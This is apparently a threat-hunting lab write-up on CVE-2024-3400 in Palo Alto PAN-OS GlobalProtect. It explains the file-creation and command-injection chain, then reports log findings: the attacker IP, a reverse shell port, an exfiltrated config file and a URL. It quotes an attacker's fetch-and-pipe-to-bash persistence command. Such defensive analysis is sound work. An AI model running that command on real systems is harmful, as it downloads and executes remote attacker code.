# Palo Alto RCE (CVE-2024-3400) — Threat Hunting Report

## Scenario
Palo Alto, a leading firewall vendor, recently disclosed a critical vulnerability (CVE-2024-3400) affecting specific versions of PAN-OS powering their next-generation firewalls. This flaw allows remote attackers to gain unauthorized access and potentially take full control of an affected firewall.

These devices play a central role in organizational security—managing inbound/outbound traffic, blocking threats, and enforcing policies. As a security analyst, your task is to determine whether systems are impacted and analyze attacker behavior.

---

## Category
Threat Hunting

## MITRE ATT&CK Tactics
- Reconnaissance  
- Initial Access  
- Execution  
- Persistence  
- Command and Control  
- Exfiltration  

## Tool Used
ELK

---

# CVE-2024-3400 — Summary

CVE-2024-3400 is a **Critical (CVSS 10.0)** vulnerability impacting Palo Alto PAN-OS used in their next-generation firewalls.  
It allows an **unauthenticated attacker** to achieve **remote code execution (RCE) as root**.

This vulnerability was actively exploited as a **zero-day in the wild**.

### Key Details

| Aspect | Detail |
|--------|--------|
| Vendor | Palo Alto Networks |
| Product | PAN-OS |
| Feature | GlobalProtect |
| Vulnerability Type | Command Injection via Arbitrary File Creation |
| Severity | 10.0 (CRITICAL) |
| Impact | Unauthenticated RCE with Root Privileges |

---

## Root Cause — Vulnerability Chain

CVE-2024-3400 consists of **two combined flaws**:

### 1. Arbitrary File Creation
A flaw in GlobalProtect session handling (affecting 10.2, 11.0, 11.1) allows an unauthenticated attacker to send a specially crafted request, causing the firewall to create a file with an arbitrary attacker-controlled filename.

### 2. Command Injection
A scheduled system job later processes the attacker’s filename, embedding it into a shell command.  
If the filename contains malicious shell code, the system executes it as **root**.

**Result:** Full device compromise with zero authentication.

---

# Incident Investigation Findings

Below are the key findings identified during the analysis.

---

## Q1: Initial Access IP Address
**Answer:** `54.162.164.22`

<img width="622" height="341" alt="image" src="https://github.com/user-attachments/assets/45995b1a-8a58-4422-8999-3a7861437d94" />

<img width="622" height="341" alt="image" src="https://github.com/user-attachments/assets/c2d23e24-207b-45bc-8007-63e374a88261" />



## Q2: Date & Time of Initial Interaction  
Format: 24h UTC  
**Answer:** `2024-04-21 18:17:07`

<img width="622" height="341" alt="image" src="https://github.com/user-attachments/assets/7ed0f004-6228-422b-a3c2-fc75fe7721e6" />


## Q3: Persistence Command Used

### Full Command:
**Answer:** `wget -qO- http://54.162.164.22/update | bash`


### Breakdown:
| Part | Meaning |
|------|---------|
| `wget` | Downloads remote content |
| `-q` | Quiet mode (suppresses output) |
| `-O-` | Send output to STDOUT instead of a file |
| `http://54.162.164.22/update` | Remote malicious script |
| `| bash` | Pipes the downloaded script directly into bash for execution |

### Security Implication
- Runs fully **in-memory**, leaving no file artifacts.
- Bypasses traditional detection.
- Provides immediate attacker control.

<img width="622" height="341" alt="image" src="https://github.com/user-attachments/assets/f9455837-56dd-4d6e-859f-22e7c3fde691" />


## Q4: First Reverse Shell Port  
**Answer:** `13337`

<img width="622" height="271" alt="image" src="https://github.com/user-attachments/assets/79b9300f-2109-41f5-8d09-0c79890f333a" />
<img width="638" height="303" alt="image" src="https://github.com/user-attachments/assets/7cdbe2aa-d6c1-43d5-9dde-4783eff4b2bd" />



## Q5: Exfiltrated File Name  
**Answer:** `running-config.xml`

<img width="627" height="308" alt="image" src="https://github.com/user-attachments/assets/59aa9930-2143-42fa-bd24-a8b7d5817dd1" />

<img width="627" height="308" alt="image" src="https://github.com/user-attachments/assets/d314f479-d3b6-4525-9d97-c04135707c46" />



## Q6: Successful Exfiltration URL  
**Answer:**  `https://44.217.16.42/global-protect/bootstrap.min.css`

<img width="627" height="308" alt="image" src="https://github.com/user-attachments/assets/26979d67-5607-46e8-8ad1-16273fdb7443" />


# End of Report


